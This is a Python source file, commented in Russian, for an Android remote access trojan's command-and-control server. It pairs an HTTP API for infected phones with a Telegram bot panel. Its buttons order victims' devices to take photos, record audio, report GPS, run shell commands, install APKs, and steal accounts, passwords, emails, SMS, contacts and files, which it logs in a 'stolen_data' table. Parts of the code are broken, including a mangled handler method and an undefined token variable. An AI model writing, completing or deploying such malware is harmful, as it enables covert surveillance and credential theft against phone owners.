#!/usr/bin/env python3
"""
Android RAT Server — для деплоя на render.com
"""

import os
import sys
import json
import base64
import logging
import sqlite3
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ВАШИ ДАННЫЕ (токен недействителен, создайте новый в @BotFather)
TOKEN = os.environ.get("TG_TOKEN")
ADMIN_ID = os.environ.get("TG_ADMIN_ID")
PORT = int(os.environ.get("PORT", 5000))
DB_FILE = "rat_clients.db"


def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT UNIQUE,
                  phone_model TEXT,
                  android_version TEXT,
                  last_seen TIMESTAMP,
                  is_online BOOLEAN DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  command TEXT,
                  status TEXT DEFAULT 'pending',
                  result TEXT,
                  created_at TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  data_type TEXT,
                  data_content TEXT,
                  created_at TIMESTAMP)''')
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")


init_db()


def register_client(client_id, phone_model, android_version):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO clients 
                 (client_id, phone_model, android_version, last_seen, is_online) 
                 VALUES (?, ?, ?, ?, 1)''',
              (client_id, phone_model, android_version, datetime.now()))
    conn.commit()
    conn.close()
    logger.info(f"Клиент зарегистрирован: {client_id}")


def save_command(client_id, command):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO commands (client_id, command, created_at) VALUES (?, ?, ?)",
              (client_id, command, datetime.now()))
    conn.commit()
    cmd_id = c.lastrowid
    conn.close()
    return cmd_id


def get_pending_commands(client_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE client_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 10",
              (client_id,))
    commands = c.fetchall()
    conn.close()
    return commands


def update_command_status(command_id, status, result=""):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
    conn.commit()
    conn.close()


def save_stolen_data(client_id, data_type, content):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_data (client_id, data_type, data_content, created_at) VALUES (?, ?, ?, ?)",
              (client_id, data_type, content, datetime.now()))
    conn.commit()
    conn.close()


def get_all_clients():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT client_id, phone_model, android_version, last_seen, is_online FROM clients")
    clients = c.fetchall()
    conn.close()
    return clients


def get_completed_results():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, client_id, command, result FROM commands WHERE status = 'completed' AND result != ''")
    results = c.fetchall()
    conn.close()
    return results


def mark_result_sent(cmd_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE commands SET result = '' WHERE id = ?", (cmd_id,))
    conn.commit()
    conn.close()


def update_client_online(client_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE clients SET last_seen = ?, is_online = 1 WHERE client_id = ?",
              (datetime.now(), client_id))
    conn.commit()
    conn.close()


class RATHTTPHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
    log_str = ' '.join(str(x) for x in args)
    logger.info(f"HTTP: {log_str}")
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Client-ID')
        self.end_headers()

    def do_GET(self):
        client_id = self.headers.get('X-Client-ID', '')
        if self.path == '/commands' and client_id:
            update_client_online(client_id)
            commands = get_pending_commands(client_id)
            cmds_list = [{"id": c[0], "command": c[1]} for c in commands]
            self._send_json({"status": "ok", "commands": cmds_list})
        elif self.path == '/ping':
            self._send_json({"status": "ok", "time": str(datetime.now())})
        else:
            self._send_json({"status": "error", "message": "Not found"}, 404)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b'{}'
        try:
            data = json.loads(body.decode())
        except Exception:
            data = {}
        client_id = data.get('client_id', self.headers.get('X-Client-ID', ''))

        if self.path == '/register':
            register_client(client_id, data.get('phone_model', 'Unknown'), data.get('android_version', 'Unknown'))
            self._send_json({"status": "ok", "client_id": client_id})
        elif self.path == '/result':
            cmd_id = data.get('command_id', 0)
            result = data.get('result', '')
            update_command_status(cmd_id, 'completed', result)
            if any(kw in result for kw in ['STEAL', 'GOOGLE', 'PASSWORD', 'EMAIL']):
                save_stolen_data(client_id, 'steal_data', result[:5000])
            self._send_json({"status": "ok"})
        elif self.path == '/heartbeat':
            update_client_online(client_id)
            self._send_json({"status": "ok"})
        else:
            self._send_json({"status": "error", "message": "Not found"}, 404)

    def do_PUT(self):
        self.do_POST()


def run_telegram_bot():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or ADMIN_ID == 0:
        logger.warning("BOT_TOKEN или ADMIN_ID не настроены. Telegram бот не запущен.")
        return

    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text("❌ Доступ запрещен")
            return
        await update.message.reply_text(
            "🤖 *Android RAT Control Panel*\n\n"
            "Управление удаленными Android устройствами\n\n"
            "Выберите действие:",
            reply_markup=main_keyboard(),
            parse_mode='Markdown'
        )

    def main_keyboard():
        keyboard = [
            [InlineKeyboardButton("📱 Список клиентов", callback_data="list_clients")],
            [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
            [InlineKeyboardButton("🔄 Обновить", callback_data="refresh")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def client_keyboard(client_id):
        keyboard = [
            [InlineKeyboardButton("📸 Фото (передняя)", callback_data=f"photo_front:{client_id}"),
             InlineKeyboardButton("📸 Фото (задняя)", callback_data=f"photo_back:{client_id}")],
            [InlineKeyboardButton("🎤 Записать звук", callback_data=f"record_audio:{client_id}"),
             InlineKeyboardButton("📍 GPS", callback_data=f"gps:{client_id}")],
            [InlineKeyboardButton("💾 Стилер: аккаунты", callback_data=f"steal_accounts:{client_id}"),
             InlineKeyboardButton("🔑 Стилер: пароли", callback_data=f"steal_passwords:{client_id}")],
            [InlineKeyboardButton("📧 Стилер: email", callback_data=f"steal_emails:{client_id}"),
             InlineKeyboardButton("🎮 Google Play", callback_data=f"google_play:{client_id}")],
            [InlineKeyboardButton("📂 Галерея", callback_data=f"gallery:{client_id}"),
             InlineKeyboardButton("📞 Контакты", callback_data=f"contacts:{client_id}")],
            [InlineKeyboardButton("💬 SMS", callback_data=f"sms:{client_id}"),
             InlineKeyboardButton("📋 Буфер обмена", callback_data=f"clipboard:{client_id}")],
            [InlineKeyboardButton("📁 Файлы", callback_data=f"files:{client_id}:/"),
             InlineKeyboardButton("⌨️ Shell", callback_data=f"shell:{client_id}")],
            [InlineKeyboardButton("📱 Установить APK", callback_data=f"install_app:{client_id}"),
             InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)

    async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data

        if data == "main_menu":
            await query.edit_message_text("Главное меню:", reply_markup=main_keyboard())
        elif data == "list_clients":
            clients = get_all_clients()
            if not clients:
                await query.edit_message_text("❌ Нет подключенных клиентов", reply_markup=main_keyboard())
                return
            msg = "📱 *Подключенные клиенты:*\n\n"
            keyboard = []
            for c in clients:
                status_icon = "🟢" if c[4] else "🔴"
                msg += f"{status_icon} `{c[0]}`\n  Модель: {c[1]}\n  Android: {c[2]}\n  Последний раз: {c[3]}\n\n"
                keyboard.append([InlineKeyboardButton(f"{status_icon} {c[0][:20]}", callback_data=f"select_client:{c[0]}")])
            keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="main_menu")])
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif data.startswith("select_client:"):
            client_id = data.split(":", 1)[1]
            await query.edit_message_text(
                f"📱 *Управление клиентом:* `{client_id}`\n\nВыберите действие:",
                reply_markup=client_keyboard(client_id), parse_mode='Markdown'
            )
        elif data.startswith("shell:"):
            client_id = data.split(":", 1)[1]
            context.user_data['current_client'] = client_id
            context.user_data['awaiting_shell'] = True
            await query.edit_message_text(
                f"⌨️ Введите shell команду для выполнения на `{client_id}`:",
                parse_mode='Markdown'
            )
        elif data.startswith("steal_accounts:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "STEAL_ACCOUNTS")
            await query.edit_message_text(f"🔍 Команда отправлена на `{client_id}`", parse_mode='Markdown')
        elif data.startswith("steal_passwords:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "STEAL_PASSWORDS")
            await query.edit_message_text(f"🔍 Команда отправлена на `{client_id}`", parse_mode='Markdown')
        elif data.startswith("steal_emails:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "STEAL_EMAILS")
            await query.edit_message_text(f"🔍 Команда отправлена на `{client_id}`", parse_mode='Markdown')
        elif data.startswith("google_play:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GOOGLE_PLAY_ACCOUNTS")
            await query.edit_message_text(f"🔍 Извлечение Google Play аккаунтов с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("gallery:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GET_GALLERY")
            await query.edit_message_text(f"🔍 Получение галереи с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("gps:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GET_GPS")
            await query.edit_message_text(f"📍 Запрос GPS координат с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("clipboard:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GET_CLIPBOARD")
            await query.edit_message_text(f"📋 Запрос буфера обмена с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("contacts:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GET_CONTACTS")
            await query.edit_message_text(f"📞 Запрос контактов с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("sms:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "GET_SMS")
            await query.edit_message_text(f"💬 Запрос SMS с `{client_id}`...", parse_mode='Markdown')
        elif data.startswith("files:"):
            _, client_id, path = data.split(":", 2)
            save_command(client_id, f"LIST_FILES:{path}")
            await query.edit_message_text(f"📁 Запрос содержимого {path}...", parse_mode='Markdown')
        elif data.startswith("photo_front:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "PHOTO_FRONT")
            await query.edit_message_text(f"📸 Фото с передней камеры запрошено...", parse_mode='Markdown')
        elif data.startswith("photo_back:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "PHOTO_BACK")
            await query.edit_message_text(f"📸 Фото с задней камеры запрошено...", parse_mode='Markdown')
        elif data.startswith("record_audio:"):
            client_id = data.split(":", 1)[1]
            save_command(client_id, "RECORD_AUDIO")
            await query.edit_message_text(f"🎤 Запись звука запущена...", parse_mode='Markdown')
        elif data.startswith("install_app:"):
            client_id = data.split(":", 1)[1]
            context.user_data['current_client'] = client_id
            context.user_data['awaiting_apk'] = True
            await query.edit_message_text("📱 Отправьте APK файл для установки", parse_mode='Markdown')
        elif data == "stats":
            clients = get_all_clients()
            total = len(clients)
            online = sum(1 for c in clients if c[4])
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM stolen_data")
            stolen_count = c.fetchone()[0]
            conn.close()
            await query.edit_message_text(
                f"📊 *Статистика:*\n\n"
                f"Всего клиентов: {total}\n"
                f"Онлайн: {online}\n"
                f"Оффлайн: {total - online}\n"
                f"Украдено данных: {stolen_count} записей",
                reply_markup=main_keyboard(), parse_mode='Markdown'
            )
        elif data == "refresh":
            await query.edit_message_text("🔄 Данные обновлены", reply_markup=main_keyboard())

    async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            return
        if context.user_data.get('awaiting_shell') and update.message.text:
            client_id = context.user_data.get('current_client')
            command = update.message.text
            save_command(client_id, f"SHELL:{command}")
            context.user_data['awaiting_shell'] = False
            await update.message.reply_text(f"⌨️ Команда отправлена на `{client_id}`\n`{command}`", parse_mode='Markdown')
        elif context.user_data.get('awaiting_apk') and update.message.document:
            client_id = context.user_data.get('current_client')
            file = await update.message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            apk_b64 = base64.b64encode(file_bytes).decode()
            save_command(client_id, f"INSTALL_APK:{apk_b64}")
            context.user_data['awaiting_apk'] = False
            await update.message.reply_text(f"📱 APK отправлен на установку на `{client_id}`", parse_mode='Markdown')

    async def poll_results(context: ContextTypes.DEFAULT_TYPE):
        results = get_completed_results()
        for cmd_id, client_id, command, result in results:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📬 *Результат с `{client_id}`*\n"
                     f"Команда: `{command}`\n\n```\n{result[:2000]}\n```",
                parse_mode='Markdown'
            )
            if result.startswith("FILE:"):
                try:
                    _, fname, fdata = result.split(":", 2)
                    fbytes = base64.b64decode(fdata)
                    if fname.endswith(('.jpg', '.jpeg', '.png')):
                        await context.bot.send_photo(chat_id=ADMIN_ID, photo=BytesIO(fbytes), caption=f"📸 Фото с {client_id}")
                    elif fname.endswith(('.mp3', '.wav', '.ogg', '.3gp')):
                        await context.bot.send_audio(chat_id=ADMIN_ID, audio=BytesIO(fbytes), caption=f"🎤 Аудио с {client_id}")
                    else:
                        bio = BytesIO(fbytes)
                        bio.name = fname
                        await context.bot.send_document(chat_id=ADMIN_ID, document=bio, caption=f"📁 Файл с {client_id} ({fname})")
                except Exception as e:
                    logger.error(f"Error sending media: {e}")
            mark_result_sent(cmd_id)

    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL, handle_message))
    app.job_queue.run_repeating(poll_results, interval=3, first=1)

    logger.info("Telegram бот запущен")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


def main():
    logger.info(f"Запуск Android RAT Server на порту {PORT}")
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    server = HTTPServer(('0.0.0.0', PORT), RATHTTPHandler)
    logger.info(f"HTTP API сервер запущен на порту {PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Остановка сервера...")
        server.shutdown()


if __name__ == "__main__":
    main()
